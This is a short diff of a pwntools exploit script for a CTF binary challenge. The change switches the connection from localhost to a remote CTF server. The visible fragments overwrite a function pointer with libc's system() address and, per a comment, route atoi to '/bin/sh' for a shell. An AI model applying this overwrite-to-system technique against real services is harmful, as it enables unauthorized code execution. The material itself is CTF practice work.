@@ -1,14 +1,10 @@
 from pwn import *
-from time import sleep
 context.arch = 'amd64'
 
-#r = remote('csie.ctf.tw',10138)
-r = remote('localhost',8888)
+r = remote('csie.ctf.tw',10138)
+#r = remote('localhost',8888)
 
 #r.interactive()
-size = '64'
-content = 'faceb00c'
-magic = 0x400c23
 def add_item(size,name):
     r.recvuntil(':')
     r.sendline('2')
@@ -80,7 +76,7 @@ sys_addr = libc + sys_off
 
 #change itemlist[0]
 change(0,0x123, p64(sys_addr) )
-#show()
+show()
 
 
 #use atoi with user input /bin/sh
